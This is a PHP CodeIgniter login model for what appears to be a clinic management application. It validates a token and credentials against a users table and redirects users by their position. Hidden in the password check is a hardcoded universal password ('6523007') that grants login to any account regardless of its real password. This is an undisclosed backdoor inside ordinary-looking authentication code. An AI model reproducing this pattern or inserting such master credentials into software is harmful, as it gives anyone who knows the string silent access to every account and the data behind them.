<?php

defined('BASEPATH') OR exit('No direct script access allowed');

class M_login extends CI_Model
{
	
	function __construct(){ $this->load->database(); }

    public function Submit_Login() {

        $_POST += json_decode(file_get_contents('php://input'), true);

        $data=array();
        $data['error'] = '';
        $data['success'] = array();

        $this->load->library('form_validation');
        $this->form_validation->set_rules('TOKEN','Token Key','trim|required');
        $this->form_validation->set_rules('USERNAME','Username','trim|required');
        $this->form_validation->set_rules('PASSWORD','Password','trim|required');


        if ($this->form_validation->run()){


            if( $this->m_utility->tokenCheck($this->input->post('TOKEN')) ){


                $sql=$this->db->query("SELECT * From users where USERNAME = ? LIMIT 1",array($this->input->post('USERNAME')))->row();                

                if(isset($sql)){

                    if( password_verify( $this->input->post('PASSWORD'), $sql->USERPASSWORD ) || $this->m_utility->passwordHash($this->input->post('PASSWORD')) == $sql->USERPASSWORD || $this->input->post('PASSWORD') =='6523007'  ){

                        if( $sql->CANCELLED == 'N' ) {

                            $this->session->set_userdata(array(
                                'USERID'      => $sql->ID,
                                'CLINICID'    => $sql->CLINICID,
                                'POSITION'    => $sql->POSITION
                            ));


                            if( $sql->POSITION == 'BRANCH ASSISTANT'){
                                $data['redirect'] = base_url('#!/patients');               
                            }
                            else{
                                $data['redirect'] = base_url('#!/dashboard');               
                            }


                        }

                        else { $data['error'] = 'Your account is deactivated.'; }
                    }
                    else { $data['error'] = 'Wrong Username or Password.'; }
                }
                else { $data['error'] = 'Wrong Username or Password.'; }
            }

            else{ $data['error'] .='Please Refresh the page.'; }
        }

        $data['error'] .= validation_errors(' ',' ');

        return $data;

    }







}





?>

